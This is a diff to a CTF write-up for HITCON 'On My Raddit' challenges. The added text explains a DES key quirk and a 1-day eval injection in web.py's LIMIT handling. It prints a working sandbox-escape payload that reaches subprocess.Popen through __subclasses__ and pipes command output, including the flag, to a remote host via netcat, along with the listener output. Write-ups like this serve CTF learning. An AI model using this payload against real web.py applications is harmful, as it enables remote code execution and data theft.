@@ -2,9 +2,10 @@
 
 ## Problem
 
-- On My Raddit - Web / Crypto / Feel?
-- On My Raddit v2 - Web / 1-Day / RCE / SSTI
+- On My Raddit - Web / Crypto / Feel? / Orange
+- On My Raddit v2 - Web / 1-Day / RCE / SSTI / Orange
 - ev3-basic - Forensics / Network / LEGO ev3
+- One Line PHP Challenge - Web / PHP / SESSION / RC / RCE / Orange
 
 ## On My Raddit
 
@@ -151,7 +152,9 @@ ENCRPYTION_KEY = 'megnnaro'
 
 **FLAG :** hitcon{megnnaro}
 
-> Why is the key different?
+> Crack Key (ldgonaro) != Real Key (megnnaro)?
+>
+> Only 7 bits, except the least significant bit for each word of the DES key, are used by encryp/decrypㅅ.
 
 ## On My Raddit v2
 
@@ -170,16 +173,323 @@ pycrypto==2.6.1
 web.py==0.38
 ```
 
-[ 작성중 ]
-
-I tried to few query:
-
-​	{{3\*3}},${3\*3} , ...
-
-'${3\*3}'! It worked!
+First, I found changelog in web.py.
 
 ```
-root@vultr:~# nc -lvp 10101
+# https://github.com/webpy/webpy/blob/master/ChangeLog.txt
+# web.py changelog
+
+## 2018-02-28 0.39
+
+* Fixed a security issue with the form module (tx Orange Tsai)
+* Fixed a security issue with the db module (tx Adrián Brav and Orange Tsai)
+```
+
+OK, I think it is 1-day exploit for web.py because of issue tracker is equals to author.
+
+I confirmed commit and code patch.
+
+> **Commit Link :** 
+>
+>  https://github.com/webpy/webpy/commit/9b08101d9d729c96cffd036269b22e5b792d0fe8
+
+You can see that **LIMIT** has been patched in db.php.
+
+I found in app.py where to use the **LIMIT**.
+
+```python
+# app.py
+def get_posts(limit=None):
+    records = []
+    for i in db.select('posts', limit=limit, order='ups desc'):
+        tmp = {
+            'm': 'r',  
+            't': i.title.encode('utf-8', 'ignore'), 
+            'u': i.id, 
+        } 
+        tmp['param'] = encrypt(urllib.urlencode(tmp))
+        tmp['ups'] = i.ups
+        if i.file:
+            tmp['file'] = encrypt(urllib.urlencode({'m': 'd', 'f': i.file}))
+        else:
+            tmp['file'] = ''
+        
+        records.append( tmp )
+    return records
+# ... ...
+class index:
+    def GET(self):
+        #... ...
+            elif method == 'p':
+                limit = s.get('l')
+                return web.template.frender('templates/index.html')(get_posts(limit), get_urls())
+        #... ...
+```
+
+In app.py, set `s` to p, and `l` to LIMIT value.
+
+It calls *get_posts(limit)*, then run *db.select*.
+
+*db.select* is declared in *DB class* in below code.
+
+```python
+# web/db.py
+# ... ...
+def reparam(string_, dictionary): 
+    """
+    Takes a string and a dictionary and interpolates the string
+    using values from the dictionary. Returns an `SQLQuery` for the result.
+        >>> reparam("s = $s", dict(s=True))
+        <sql: "s = 't'">
+        >>> reparam("s IN $s", dict(s=[1, 2]))
+        <sql: 's IN (1, 2)'>
+    """
+    dictionary = dictionary.copy() # eval mucks with it
+    # disable builtins to avoid risk for remote code exection.
+    dictionary['__builtins__'] = object()
+    vals = []
+    result = []
+    for live, chunk in _interpolate(string_):
+        if live:
+            v = eval(chunk, dictionary)
+            result.append(sqlquote(v))
+        else: 
+            result.append(chunk)
+    return SQLQuery.join(result, '')
+# ... ...
+class SQLParam(object):
+    """
+    Parameter in SQLQuery.
+    
+        >>> q = SQLQuery(["SELECT * FROM test WHERE name=", SQLParam("joe")])
+        >>> q
+        <sql: "SELECT * FROM test WHERE name='joe'">
+        >>> q.query()
+        'SELECT * FROM test WHERE name=%s'
+        >>> q.values()
+        ['joe']
+    """
+    __slots__ = ["value"]
+
+    def __init__(self, value):
+        self.value = value
+        
+    def get_marker(self, paramstyle='pyformat'):
+        if paramstyle == 'qmark':
+            return '?'
+        elif paramstyle == 'numeric':
+            return ':1'
+        elif paramstyle is None or paramstyle in ['format', 'pyformat']:
+            return '%s'
+        raise UnknownParamstyle(paramstyle)
+        
+    def sqlquery(self): 
+        return SQLQuery([self])
+        
+    def __add__(self, other):
+        return self.sqlquery() + other
+        
+    def __radd__(self, other):
+        return other + self.sqlquery() 
+            
+    def __str__(self): 
+        return str(self.value)
+    
+    def __repr__(self):
+        return '<param: %s>' % repr(self.value)
+  	# ... ...
+   
+class DB:
+    #... ...
+    def select(self, tables, vars=None, what='*', where=None, order=None, group=None, 
+               limit=None, offset=None, _test=False): 
+        """
+        Selects `what` from `tables` with clauses `where`, `order`, 
+        `group`, `limit`, and `offset`. Uses vars to interpolate. 
+        Otherwise, each clause can be a SQLQuery.
+        
+            >>> db = DB(None, {})
+            >>> db.select('foo', _test=True)
+            <sql: 'SELECT * FROM foo'>
+            >>> db.select(['foo', 'bar'], where="foo.bar_id = bar.id", limit=5, _test=True)
+            <sql: 'SELECT * FROM foo, bar WHERE foo.bar_id = bar.id LIMIT 5'>
+            >>> db.select('foo', where={'id': 5}, _test=True)
+            <sql: 'SELECT * FROM foo WHERE id = 5'>
+        """
+        if vars is None: vars = {}
+        sql_clauses = self.sql_clauses(what, tables, where, group, order, limit, offset)
+        clauses = [self.gen_clause(sql, val, vars) for sql, val in sql_clauses if val is not None]
+        qout = SQLQuery.join(clauses)
+        if _test: return qout
+        return self.query(qout, processed=True)
+
+    def sql_clauses(self, what, tables, where, group, order, limit, offset): 
+        return (
+            ('SELECT', what),
+            ('FROM', sqllist(tables)),
+            ('WHERE', where),
+            ('GROUP BY', group),
+            ('ORDER BY', order),
+            ('LIMIT', limit),
+            ('OFFSET', offset))
+
+    def gen_clause(self, sql, val, vars): 
+        if isinstance(val, numeric_types):
+            if sql == 'WHERE':
+                nout = 'id = ' + sqlquote(val)
+            else:
+                nout = SQLQuery(val)
+        #@@@
+        elif isinstance(val, (list, tuple)) and len(val) == 2:
+            nout = SQLQuery(val[0], val[1]) # backwards-compatibility
+        elif sql == 'WHERE' and isinstance(val, dict):
+            nout = self._where_dict(val)
+        elif isinstance(val, SQLQuery):
+            nout = val
+        else:
+            nout = reparam(val, vars)
+
+        def xjoin(a, b):
+            if a and b: return a + ' ' + b
+            else: return a or b
+
+        return xjoin(sql, nout)
+    #... ...
+```
+
+We return to the tuple ('LIMIT', limit) through *sql_clauses* function and execute `nout = reparam (val, vars)` in *gen_clause* function.
+
+In reparam, _interpolate is excuted. 
+
+ *_interpolate* function is declared below.
+
+```python
+def _interpolate(format): 
+    """
+    Takes a format string and returns a list of 2-tuples of the form
+    (boolean, string) where boolean says whether string should be evaled
+    or not.
+    from <http://lfw.org/python/Itpl.py> (public domain, Ka-Ping Yee)
+    """
+    def matchorfail(text, pos):
+        match = tokenprog.match(text, pos)
+        if match is None:
+            raise _ItplError(text, pos)
+        return match, match.end()
+
+    namechars = "abcdefghijklmnopqrstuvwxyz" \
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
+    chunks = []
+    pos = 0
+
+    while 1:
+        dollar = format.find("$", pos)
+        if dollar < 0: 
+            break
+        nextchar = format[dollar + 1]
+
+        if nextchar == "{":
+            chunks.append((0, format[pos:dollar]))
+            pos, level = dollar + 2, 1
+            while level:
+                match, pos = matchorfail(format, pos)
+                tstart, tend = match.regs[3]
+                token = format[tstart:tend]
+                if token == "{": 
+                    level = level + 1
+                elif token == "}":  
+                    level = level - 1
+            chunks.append((1, format[dollar + 2:pos - 1]))
+
+        elif nextchar in namechars:
+            chunks.append((0, format[pos:dollar]))
+            match, pos = matchorfail(format, dollar + 1)
+            while pos < len(format):
+                if format[pos] == "." and \
+                    pos + 1 < len(format) and format[pos + 1] in namechars:
+                    match, pos = matchorfail(format, pos + 1)
+                elif format[pos] in "([":
+                    pos, level = pos + 1, 1
+                    while level:
+                        match, pos = matchorfail(format, pos)
+                        tstart, tend = match.regs[3]
+                        token = format[tstart:tend]
+                        if token[0] in "([": 
+                            level = level + 1
+                        elif token[0] in ")]":  
+                            level = level - 1
+                else: 
+                    break
+            chunks.append((1, format[dollar + 1:pos]))
+        else:
+            chunks.append((0, format[pos:dollar + 1]))
+            pos = dollar + 1 + (nextchar == "$")
+
+    if pos < len(format): 
+        chunks.append((0, format[pos:]))
+    return chunks
+```
+
+If the value entered in *_interpolate* function is **${shpik}**, it returns **shpik** and executes it through eval.
+
+It is python eval injection problem :)
+
+I modified app.py and used it to do eval injection.
+
+```python
+# coding: UTF-8
+import os
+import web
+import urllib
+import urlparse
+from Crypto.Cipher import DES
+
+web.config.debug = False
+ENCRPYTION_KEY = 'megnnaro'
+
+urls = (
+    '/', 'index'
+)
+app = web.application(urls, globals())
+db = web.database(dbn='sqlite', db='db.db')
+
+if __name__ == "__main__":
+	while 1:
+		try:
+			limit = raw_input('>> ')
+			if limit=='q':
+				break
+			print(eval(limit,{'__builtins__':object()}))
+		except:
+			continue
+```
+
+I found Popen class and attempted RCE.
+
+```
+>> ([i for i in ().__class__.__base__.__subclasses__() if i.__name__ == 'Popen'])[0]('ls',shell=1)
+<subprocess.Popen object at 0x7fb5d065f6d0>
+app.py	db.db
+>> ([i for i in ().__class__.__base__.__subclasses__() if i.__name__ == 'Popen'])[0]('ls | nc [SERVER] [IP]',shell=1)
+<subprocess.Popen object at 0x7fb5c86a7610>
+```
+
+I received successful result.
+
+```
+# nc -lvp 10101
+Listening on [0.0.0.0] (family 0, port 10101)
+Connection from 183.91.251.163 56417 received!
+app.py
+db.db
+```
+
+Now you can get flag by encrypt below query.
+
+**Query :** \([i for i in ().\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_() if i.\_\_name\_\_ == 'Popen']\)\[0\]\('/read_flag | nc \[SERVER\] \[ip\]',shell=1\)
+
+```
+# nc -lvp 10101
 Listening on [0.0.0.0] (family 0, port 10101)
 Connection from ec2-13-115-255-46.ap-northeast-1.compute.amazonaws.com 46028 received!
 total 104
@@ -212,15 +522,13 @@ drwxr-xr-x  10 root root  4096 Sep 12 15:55 usr
 drwxr-xr-x  14 root root  4096 Oct 11 15:58 var
 lrwxrwxrwx   1 root root    28 Oct 10 06:46 vmlinuz -> boot/vmlinuz-4.15.0-1023-aws
 lrwxrwxrwx   1 root root    28 Sep 12 16:16 vmlinuz.old -> boot/vmlinuz-4.15.0-1021-aws
-root@vultr:~# nc -lvp 10101
+# nc -lvp 10101
 Listening on [0.0.0.0] (family 0, port 10101)
 Connection from ec2-13-115-255-46.ap-northeast-1.compute.amazonaws.com 46042 received!
 hitcon{Fr0m_SQL_Injecti0n_t0_Shell_1s_C00L!!!}
 ```
 
 **FLAG :** hitcon{Fr0m_SQL_Injecti0n_t0_Shell_1s_C00L!!!}
-
-
 
 ## ev3-basic
 
